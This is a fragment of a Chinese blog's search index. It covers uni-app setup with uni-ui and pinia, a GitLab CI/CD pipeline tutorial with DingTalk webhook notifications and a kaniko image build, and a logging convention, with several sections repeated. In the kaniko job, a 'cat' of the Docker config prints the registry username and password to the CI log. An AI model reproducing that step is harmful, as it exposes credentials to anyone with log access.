","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:3:2","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#开发配置"},{"categories":["blog"],"content":" 开发配置 UI 配置安装 uni-ui： pnpm i @dcloudio/uni-ui 安装 sass pnpm i sass -D 项目根路径添加 vue.config.js // vue.config.js module.exports = { transpileDependencies:['@dcloudio/uni-ui'] } 配置组件自动引入 // pages.json { \"easycom\": { \"autoscan\": true, \"custom\": { // uni-ui 规则如下配置 \"^uni-(.*)\": \"@dcloudio/uni-ui/lib/uni-$1/uni-$1.vue\" } }, \"pages\": [ // … ] } 配置 ts 类型：pnpm i -D @uni-helper/uni-ui-types // tsconfig.json { \"compilerOptions\": { \"types\": [ \"@dcloudio/types\", \"@types/wechat-miniprogram\", \"@uni-helper/uni-app-types\", + \"@uni-helper/uni-ui-types\" ] }, } 安全边距 // 拿到安全区域距离，单位是px // 比如自定义导航栏。在拿到top以后，给导航加上样式 :style=\"{ paddingTop: safeAreaInsets?.top + 'px' }\" const { safeAreaInsets } = uni.getSystemInfoSync() console.log(safeAreaInsets) 状态管理/持久化存储安装依赖 pnpm i pinia pinia-plugin-persistedstate 创建 src/stores/index.ts import { createPinia } from \"pinia\"; import persist from \"pinia-plugin-persistedstate\"; // 创建 pinia 实例 const pinia = createPinia(); // 使用持久化存储插件 pinia.use(persist); // 默认导出，给 main.ts 使用 export default pinia; // 模块统一导出 export * from \"./modules/user\"; 创建 src/stores/modules/user.ts, 保存用户信息的示例 import { defineStore } from \"pinia\"; import { ref } from \"vue\"; interface User { username: string; role: string; } // 定义 Store export const userStore = defineStore( \"user\", () =\u003e { // 用户信息 const user = ref(); // 保存用户信息 const setProfile = (val: User) =\u003e { user.value = val; }; // 清理用户信息，退出时使用 const clearProfile = () =\u003e { user.value = undefined; }; // 记得 return return { user, setProfile, clearProfile, }; }, // 持久化 { persist: { // 默认是localStorage，改成uni来兼容多端 storage: { setItem(key, value) { uni.setStorageSync(key, value); }, getItem(key) { return uni.getStorageSync(key); }, }, }, } ); main.ts 中引入使用 app.use(pinia); ","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:3:2","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#ui-配置"},{"categories":["blog"],"content":" 开发配置 UI 配置安装 uni-ui： pnpm i @dcloudio/uni-ui 安装 sass pnpm i sass -D 项目根路径添加 vue.config.js // vue.config.js module.exports = { transpileDependencies:['@dcloudio/uni-ui'] } 配置组件自动引入 // pages.json { \"easycom\": { \"autoscan\": true, \"custom\": { // uni-ui 规则如下配置 \"^uni-(.*)\": \"@dcloudio/uni-ui/lib/uni-$1/uni-$1.vue\" } }, \"pages\": [ // … ] } 配置 ts 类型：pnpm i -D @uni-helper/uni-ui-types // tsconfig.json { \"compilerOptions\": { \"types\": [ \"@dcloudio/types\", \"@types/wechat-miniprogram\", \"@uni-helper/uni-app-types\", + \"@uni-helper/uni-ui-types\" ] }, } 安全边距 // 拿到安全区域距离，单位是px // 比如自定义导航栏。在拿到top以后，给导航加上样式 :style=\"{ paddingTop: safeAreaInsets?.top + 'px' }\" const { safeAreaInsets } = uni.getSystemInfoSync() console.log(safeAreaInsets) 状态管理/持久化存储安装依赖 pnpm i pinia pinia-plugin-persistedstate 创建 src/stores/index.ts import { createPinia } from \"pinia\"; import persist from \"pinia-plugin-persistedstate\"; // 创建 pinia 实例 const pinia = createPinia(); // 使用持久化存储插件 pinia.use(persist); // 默认导出，给 main.ts 使用 export default pinia; // 模块统一导出 export * from \"./modules/user\"; 创建 src/stores/modules/user.ts, 保存用户信息的示例 import { defineStore } from \"pinia\"; import { ref } from \"vue\"; interface User { username: string; role: string; } // 定义 Store export const userStore = defineStore( \"user\", () =\u003e { // 用户信息 const user = ref(); // 保存用户信息 const setProfile = (val: User) =\u003e { user.value = val; }; // 清理用户信息，退出时使用 const clearProfile = () =\u003e { user.value = undefined; }; // 记得 return return { user, setProfile, clearProfile, }; }, // 持久化 { persist: { // 默认是localStorage，改成uni来兼容多端 storage: { setItem(key, value) { uni.setStorageSync(key, value); }, getItem(key) { return uni.getStorageSync(key); }, }, }, } ); main.ts 中引入使用 app.use(pinia); ","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:3:2","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#安全边距"},{"categories":["blog"],"content":" 开发配置 UI 配置安装 uni-ui： pnpm i @dcloudio/uni-ui 安装 sass pnpm i sass -D 项目根路径添加 vue.config.js // vue.config.js module.exports = { transpileDependencies:['@dcloudio/uni-ui'] } 配置组件自动引入 // pages.json { \"easycom\": { \"autoscan\": true, \"custom\": { // uni-ui 规则如下配置 \"^uni-(.*)\": \"@dcloudio/uni-ui/lib/uni-$1/uni-$1.vue\" } }, \"pages\": [ // … ] } 配置 ts 类型：pnpm i -D @uni-helper/uni-ui-types // tsconfig.json { \"compilerOptions\": { \"types\": [ \"@dcloudio/types\", \"@types/wechat-miniprogram\", \"@uni-helper/uni-app-types\", + \"@uni-helper/uni-ui-types\" ] }, } 安全边距 // 拿到安全区域距离，单位是px // 比如自定义导航栏。在拿到top以后，给导航加上样式 :style=\"{ paddingTop: safeAreaInsets?.top + 'px' }\" const { safeAreaInsets } = uni.getSystemInfoSync() console.log(safeAreaInsets) 状态管理/持久化存储安装依赖 pnpm i pinia pinia-plugin-persistedstate 创建 src/stores/index.ts import { createPinia } from \"pinia\"; import persist from \"pinia-plugin-persistedstate\"; // 创建 pinia 实例 const pinia = createPinia(); // 使用持久化存储插件 pinia.use(persist); // 默认导出，给 main.ts 使用 export default pinia; // 模块统一导出 export * from \"./modules/user\"; 创建 src/stores/modules/user.ts, 保存用户信息的示例 import { defineStore } from \"pinia\"; import { ref } from \"vue\"; interface User { username: string; role: string; } // 定义 Store export const userStore = defineStore( \"user\", () =\u003e { // 用户信息 const user = ref(); // 保存用户信息 const setProfile = (val: User) =\u003e { user.value = val; }; // 清理用户信息，退出时使用 const clearProfile = () =\u003e { user.value = undefined; }; // 记得 return return { user, setProfile, clearProfile, }; }, // 持久化 { persist: { // 默认是localStorage，改成uni来兼容多端 storage: { setItem(key, value) { uni.setStorageSync(key, value); }, getItem(key) { return uni.getStorageSync(key); }, }, }, } ); main.ts 中引入使用 app.use(pinia); ","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:3:2","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#状态管理持久化存储"},{"categories":["blog"],"content":" 资源","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:4:0","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#资源"},{"categories":["blog"],"content":" uni-app # 项目模板代码 git clone -b template https://gitee.com/heima-fe/uniapp-shop-vue3-ts.git heima-shop # 项目成品代码 git clone https://gitee.com/Megasu/uniapp-shop-vue3-ts.git ","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:4:1","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#uni-app"},{"categories":["blog"],"content":"这里记录 [[笔记/point/gitlab|gitlab]] 的 [[笔记/point/CICD|CICD]] 使用. 安装部署可以看 [[笔记/gitlab教程|gitlab教程]].","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介这里记录 gitlab 的 CICD 使用. 安装部署可以看 gitlab教程. ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 流水线总览","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#流水线总览"},{"categories":["blog"],"content":" 前置动作在 gitlab 的 UI 界面操作，规范 CICD 相关的内容。 创建一个 group 名为 devops，存放所有 CICD 相关内容 创建一个 repo 名为 cicd-entrypoint，存放流水线的入口文件 创建 cicd 文件 main.yml 是入口。包含通用步骤和引入其他步骤 debug.yml 调试相关。可以输出变量，调试语法等 global.yml 全局动作。可以用来发送通知。 java.yml 是特定 java 的内容 创建 gitlab 全局 CICD 环境变量，admin管理界面=\u003esetting=\u003eCICD=\u003eVariables image_registry 镜像仓库地址 image_registry_username 镜像仓库用户名 image_registry_password 镜像仓库密码 dingding_bot 钉钉群机器人 ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#前置动作"},{"categories":["blog"],"content":" main.yml 限制分支启动流水线 workflow: rules: # main只是用来测试，后面可能会删除 # - if: $CI_COMMIT_REF_NAME == \"main\" || $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"main\" # when: always - if: $CI_COMMIT_REF_NAME == \"test\" when: always - if: $CI_COMMIT_REF_NAME == \"beta\" when: always - if: $CI_COMMIT_REF_NAME == \"prod\" when: always # 默认禁止执行CICD - when: never 默认即使项目引入，也不启动流水线 只有 test, beta, prod 启动流水线 整体步骤规划定义一个比较通用的构建步骤。例如： debug 调试：打印初始信息，初始变量 global_before 全局初始动作： 发送构建通知到钉钉群 before 流水线级别前置动作：如果是定时构建，检查代码是否有变化。或者跑单元测试 build_code 构建代码：前端构建 dist，java 构建 jar 包 build_image 构建镜像：拿到产物，构建推送镜像 deploy 部署动作：部署代码到 k8s after 流水线级别后置动作：删除本地缓存？产物？ global_after 全局结束动作：通知发版完成 stages: - debug - global_before - before - build_code - build_image - deploy - after - global_after 流水线变量一些你可能用到的流水线变量。相比 gitlab 的全局变量： 只有使用这个流水线的才会有这个值，避免全局污染 同时不需要每个项目都进行变量配置，方便 variables: # 应用容器数量 默认1 # 生产环境使用对应的环境变量来配置 replica_count: ${replica_count} 引入其他步骤 include: - local: \"/debug.yml\" - local: \"/global.yml\" - local: \"/java.yml\" rules: - if: $app_type == \"java\" - local: \"/node_static.yml\" rules: - if: $app_type == \"node_static\" 引入调试，全局动作的 yml 文件 如果检测到变量 app_type 是 java，说明要使用 java.yml 流程 node_static 类型是 node 构建出来静态页文件，让 nginx 去提供 http 服务 ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#mainyml"},{"categories":["blog"],"content":" main.yml 限制分支启动流水线 workflow: rules: # main只是用来测试，后面可能会删除 # - if: $CI_COMMIT_REF_NAME == \"main\" || $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"main\" # when: always - if: $CI_COMMIT_REF_NAME == \"test\" when: always - if: $CI_COMMIT_REF_NAME == \"beta\" when: always - if: $CI_COMMIT_REF_NAME == \"prod\" when: always # 默认禁止执行CICD - when: never 默认即使项目引入，也不启动流水线 只有 test, beta, prod 启动流水线 整体步骤规划定义一个比较通用的构建步骤。例如： debug 调试：打印初始信息，初始变量 global_before 全局初始动作： 发送构建通知到钉钉群 before 流水线级别前置动作：如果是定时构建，检查代码是否有变化。或者跑单元测试 build_code 构建代码：前端构建 dist，java 构建 jar 包 build_image 构建镜像：拿到产物，构建推送镜像 deploy 部署动作：部署代码到 k8s after 流水线级别后置动作：删除本地缓存？产物？ global_after 全局结束动作：通知发版完成 stages: - debug - global_before - before - build_code - build_image - deploy - after - global_after 流水线变量一些你可能用到的流水线变量。相比 gitlab 的全局变量： 只有使用这个流水线的才会有这个值，避免全局污染 同时不需要每个项目都进行变量配置，方便 variables: # 应用容器数量 默认1 # 生产环境使用对应的环境变量来配置 replica_count: ${replica_count} 引入其他步骤 include: - local: \"/debug.yml\" - local: \"/global.yml\" - local: \"/java.yml\" rules: - if: $app_type == \"java\" - local: \"/node_static.yml\" rules: - if: $app_type == \"node_static\" 引入调试，全局动作的 yml 文件 如果检测到变量 app_type 是 java，说明要使用 java.yml 流程 node_static 类型是 node 构建出来静态页文件，让 nginx 去提供 http 服务 ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#限制分支启动流水线"},{"categories":["blog"],"content":" main.yml 限制分支启动流水线 workflow: rules: # main只是用来测试，后面可能会删除 # - if: $CI_COMMIT_REF_NAME == \"main\" || $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"main\" # when: always - if: $CI_COMMIT_REF_NAME == \"test\" when: always - if: $CI_COMMIT_REF_NAME == \"beta\" when: always - if: $CI_COMMIT_REF_NAME == \"prod\" when: always # 默认禁止执行CICD - when: never 默认即使项目引入，也不启动流水线 只有 test, beta, prod 启动流水线 整体步骤规划定义一个比较通用的构建步骤。例如： debug 调试：打印初始信息，初始变量 global_before 全局初始动作： 发送构建通知到钉钉群 before 流水线级别前置动作：如果是定时构建，检查代码是否有变化。或者跑单元测试 build_code 构建代码：前端构建 dist，java 构建 jar 包 build_image 构建镜像：拿到产物，构建推送镜像 deploy 部署动作：部署代码到 k8s after 流水线级别后置动作：删除本地缓存？产物？ global_after 全局结束动作：通知发版完成 stages: - debug - global_before - before - build_code - build_image - deploy - after - global_after 流水线变量一些你可能用到的流水线变量。相比 gitlab 的全局变量： 只有使用这个流水线的才会有这个值，避免全局污染 同时不需要每个项目都进行变量配置，方便 variables: # 应用容器数量 默认1 # 生产环境使用对应的环境变量来配置 replica_count: ${replica_count} 引入其他步骤 include: - local: \"/debug.yml\" - local: \"/global.yml\" - local: \"/java.yml\" rules: - if: $app_type == \"java\" - local: \"/node_static.yml\" rules: - if: $app_type == \"node_static\" 引入调试，全局动作的 yml 文件 如果检测到变量 app_type 是 java，说明要使用 java.yml 流程 node_static 类型是 node 构建出来静态页文件，让 nginx 去提供 http 服务 ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#整体步骤规划"},{"categories":["blog"],"content":" main.yml 限制分支启动流水线 workflow: rules: # main只是用来测试，后面可能会删除 # - if: $CI_COMMIT_REF_NAME == \"main\" || $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"main\" # when: always - if: $CI_COMMIT_REF_NAME == \"test\" when: always - if: $CI_COMMIT_REF_NAME == \"beta\" when: always - if: $CI_COMMIT_REF_NAME == \"prod\" when: always # 默认禁止执行CICD - when: never 默认即使项目引入，也不启动流水线 只有 test, beta, prod 启动流水线 整体步骤规划定义一个比较通用的构建步骤。例如： debug 调试：打印初始信息，初始变量 global_before 全局初始动作： 发送构建通知到钉钉群 before 流水线级别前置动作：如果是定时构建，检查代码是否有变化。或者跑单元测试 build_code 构建代码：前端构建 dist，java 构建 jar 包 build_image 构建镜像：拿到产物，构建推送镜像 deploy 部署动作：部署代码到 k8s after 流水线级别后置动作：删除本地缓存？产物？ global_after 全局结束动作：通知发版完成 stages: - debug - global_before - before - build_code - build_image - deploy - after - global_after 流水线变量一些你可能用到的流水线变量。相比 gitlab 的全局变量： 只有使用这个流水线的才会有这个值，避免全局污染 同时不需要每个项目都进行变量配置，方便 variables: # 应用容器数量 默认1 # 生产环境使用对应的环境变量来配置 replica_count: ${replica_count} 引入其他步骤 include: - local: \"/debug.yml\" - local: \"/global.yml\" - local: \"/java.yml\" rules: - if: $app_type == \"java\" - local: \"/node_static.yml\" rules: - if: $app_type == \"node_static\" 引入调试，全局动作的 yml 文件 如果检测到变量 app_type 是 java，说明要使用 java.yml 流程 node_static 类型是 node 构建出来静态页文件，让 nginx 去提供 http 服务 ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#流水线变量"},{"categories":["blog"],"content":" main.yml 限制分支启动流水线 workflow: rules: # main只是用来测试，后面可能会删除 # - if: $CI_COMMIT_REF_NAME == \"main\" || $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"main\" # when: always - if: $CI_COMMIT_REF_NAME == \"test\" when: always - if: $CI_COMMIT_REF_NAME == \"beta\" when: always - if: $CI_COMMIT_REF_NAME == \"prod\" when: always # 默认禁止执行CICD - when: never 默认即使项目引入，也不启动流水线 只有 test, beta, prod 启动流水线 整体步骤规划定义一个比较通用的构建步骤。例如： debug 调试：打印初始信息，初始变量 global_before 全局初始动作： 发送构建通知到钉钉群 before 流水线级别前置动作：如果是定时构建，检查代码是否有变化。或者跑单元测试 build_code 构建代码：前端构建 dist，java 构建 jar 包 build_image 构建镜像：拿到产物，构建推送镜像 deploy 部署动作：部署代码到 k8s after 流水线级别后置动作：删除本地缓存？产物？ global_after 全局结束动作：通知发版完成 stages: - debug - global_before - before - build_code - build_image - deploy - after - global_after 流水线变量一些你可能用到的流水线变量。相比 gitlab 的全局变量： 只有使用这个流水线的才会有这个值，避免全局污染 同时不需要每个项目都进行变量配置，方便 variables: # 应用容器数量 默认1 # 生产环境使用对应的环境变量来配置 replica_count: ${replica_count} 引入其他步骤 include: - local: \"/debug.yml\" - local: \"/global.yml\" - local: \"/java.yml\" rules: - if: $app_type == \"java\" - local: \"/node_static.yml\" rules: - if: $app_type == \"node_static\" 引入调试，全局动作的 yml 文件 如果检测到变量 app_type 是 java，说明要使用 java.yml 流程 node_static 类型是 node 构建出来静态页文件，让 nginx 去提供 http 服务 ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#引入其他步骤"},{"categories":["blog"],"content":" debug.yml 调试 debug: image: busybox:latest stage: debug variables: GIT_STRATEGY: none rules: - if: $DEBUG == \"true\" script: - echo $CI_BUILDS_DIR - echo $CI_BUILDS_DIR - echo $CI_PROJECT_PATH - echo $CI_COMMIT_BRANCH - pwd - echo $CI_COMMIT_BRANCH - echo $CI_COMMIT_REF_NAME - echo $CI_MERGE_REQUEST_TARGET_BRANCH_NAME - echo $app_type 输出一些变量值 特定项目需要 debug 的时候，配置环境变量才会运行。节省时间 ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#debugyml-调试"},{"categories":["blog"],"content":" global.yml 全局动作 构建前发送钉钉通知 发版成功，失败。都有一个任务钉钉通知 global_before: image: docker.m.daocloud.io/curlimages/curl stage: global_before variables: GIT_STRATEGY: none script: - export text=\"### ⚠${CI_PROJECT_NAME}自动构建中...⚠ \\n * 分支名：${CI_COMMIT_REF_NAME} \\n * 提交人：${CI_COMMIT_AUTHOR}\\n * 提交信息：${CI_COMMIT_MESSAGE} \\n * 提交id：${CI_COMMIT_SHORT_SHA} \\n * 流水线地址：${CI_PIPELINE_URL} \" - \u003e curl --location --request POST $dingding_bot --header 'Content-Type: application/json' --data-raw '{ \"msgtype\": \"markdown\", \"markdown\": { \"title\": \"gitlab\", \"text\": \"'\"${text}\"'\" } }' global_after_on_failure: image: docker.m.daocloud.io/curlimages/curl stage: global_after variables: GIT_STRATEGY: none when: on_failure script: - export text=\"### ❌${CI_PROJECT_NAME}构建发布失败❌ \\n * 分支名：${CI_COMMIT_REF_NAME} \\n * 提交人：${CI_COMMIT_AUTHOR}\\n * 提交信息：${CI_COMMIT_MESSAGE} \\n * 提交id：${CI_COMMIT_SHORT_SHA} \\n * 流水线地址：${CI_PIPELINE_URL} \" - \u003e curl --location --request POST $dingding_bot --header 'Content-Type: application/json' --data-raw '{ \"msgtype\": \"markdown\", \"markdown\": { \"title\": \"gitlab\", \"text\": \"'\"${text}\"'\" } }' global_after_on_success: image: docker.m.daocloud.io/curlimages/curl stage: global_after variables: GIT_STRATEGY: none when: on_success script: - export text=\"### ✅${CI_PROJECT_NAME}发布成功✅ \\n * 分支名：${CI_COMMIT_REF_NAME} \\n * 提交人：${CI_COMMIT_AUTHOR}\\n * 提交信息：${CI_COMMIT_MESSAGE} \\n * 提交id：${CI_COMMIT_SHORT_SHA} \\n * 流水线地址：${CI_PIPELINE_URL} \" - \u003e curl --location --request POST $dingding_bot --header 'Content-Type: application/json' --data-raw '{ \"msgtype\": \"markdown\", \"markdown\": { \"title\": \"gitlab\", \"text\": \"'\"${text}\"'\" } }' ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:2:4","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#globalyml-全局动作"},{"categories":["blog"],"content":" 实现构建部署","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#实现构建部署"},{"categories":["blog"],"content":" 缓存/产物 缓存：每次构建拉取，通常只是 1 个 stage 自己使用。例如前端只有安装依赖的时候用的上，其他时候都不需要 node_modules 产物：提供给用户下载，在不同 stage 之间传递。例如前端 dist 构建物传递到 docker 镜像构建 ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#缓存产物"},{"categories":["blog"],"content":" 前端示例 node-build: image: docker.m.daocloud.io/node:18 stage: build_code # 缓存node_modules # 用项目id做key，不和其他项目缓存共享 cache: - key: cache-$CI_PROJECT_ID paths: - node_modules # 产物dist文件夹 # 1星期以后删除 artifacts: paths: - dist expire_in: 1 week script: - npm i --registry=https://registry.npmmirror.com --disturl=https://npmmirror.com/dist - npm run build:h5 - npm run build:mp-weixin node-deploy: image: name: m.daocloud.io/gcr.io/kaniko-project/executor:debug entrypoint: [\"\"] stage: build_image script: # 不需要任何配置，产物会被下载过来。而cache不会 - ls dist/build/h5 - mkdir -p /kaniko/.docker - | echo \" { \\\"auths\\\": { \\\"${image_registry}\\\":{ \\\"username\\\":\\\"${image_registry_username}\\\", \\\"password\\\":\\\"${image_registry_password}\\\" } } } \" \u003e /kaniko/.docker/config.json - cat /kaniko/.docker/config.json - \u003e /kaniko/executor --registry-mirror=docker.m.daocloud.io --context \"${CI_PROJECT_DIR}\" --dockerfile \"${CI_PROJECT_DIR}/Dockerfile\" --destination \"${image_registry}/om/demo:${CI_COMMIT_TAG}\" ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:3:2","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#前端示例"},{"categories":["blog"],"content":" 使用流水线创建一个代码仓库，根路径添加 .gitlab-ci.yml 文件。内容如下： include: - project: \"devops/cicd-entrypoint\" ref: main file: \"/main.yml\" ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#使用流水线"},{"categories":["blog"],"content":" 报错处理","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:5:0","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#报错处理"},{"categories":["blog"],"content":" 多行字符串总结情况如下： 如果是多行单独的命令。建议使用 多行独立的 script 语句 如果是一条长命令，例如 docker run xxx，curl xxx。建议使用 \u003e 折叠符号 每一行的起始位置都应该对齐，不包含空格 如果是 echo xxx \u003e 一个文件，想要保持文件的格式。建议使用 | 符号 为了确保格式正确，建议用引号包裹字符串 可以在 这个网站 学习怎么使用。gitlab 也有 相关的文档示例。 ","date":"2024-01-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/:5:1","series":null,"tags":["blog","gitlab"],"title":"gitlab-cicd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab-cicd%E6%95%99%E7%A8%8B/#多行字符串"},{"categories":["blog"],"content":" 简介为什么会有这篇文章？ 日志无论在什么时候，都是一个重要的工具。而一个好的日志规范，可以避免/解决很多问题： 低成本。一次配置，一次学习即可 适用性强。解决对接各个开源组件，云厂商 好用/便捷。 ","date":"2024-01-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/:1:0","series":null,"tags":["devops","blog"],"title":"应用日志规范","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/#简介"},{"categories":["blog"],"content":" 设计","date":"2024-01-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/:2:0","series":null,"tags":["devops","blog"],"title":"应用日志规范","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/#设计"},{"categories":["blog"],"content":" 日志存放的目录/文件日志文件存放在 /data/logs/，如果 linux 系统如果不存在这个路径，创建出来这个路径。 路径下最多会有 2 个日志文件。 App1-20240115.log 此文件为当天日志写入的文件。app 名称不允许重复，可以使用 git 仓库名 group1-app1 来确保唯一。 App1-20240114.log 此文件为前 1 天的备份文件，在轮转日志的时候，保证日志完整采集 例如 golang 的 lumberjack，当前写入的文件名为 App1.log，没有日期后缀也是可以正常处理的。参考下面的日志处理部分 ","date":"2024-01-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/:2:1","series":null,"tags":["devops","blog"],"title":"应用日志规范","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/#日志存放的目录文件"},{"categories":["blog"],"content":" 日志内容字段含义： time 记录时间: 2024-01-08T15:30:45.123+08:00 标准的 iso 8601 时间戳，方便阅读 level 日志等级: Information, Debug 枚举有限的值 source 调用源/异常点: csharp 里 Properties.SourceContext 和 golang 的 caller 这样的值 msg 具体信息: xxx登录成功了 控制台输出格式 logfmt 格式。方便明白每个字段的含义 因兼容性问题，关闭色彩 time=2024-01-08T15:30:45.123+08:00 level=info source=main.go:112 msg=\"xxx登录成功了\" xx=oo 文件输出格式 json 格式。方便解析 单行方便分割 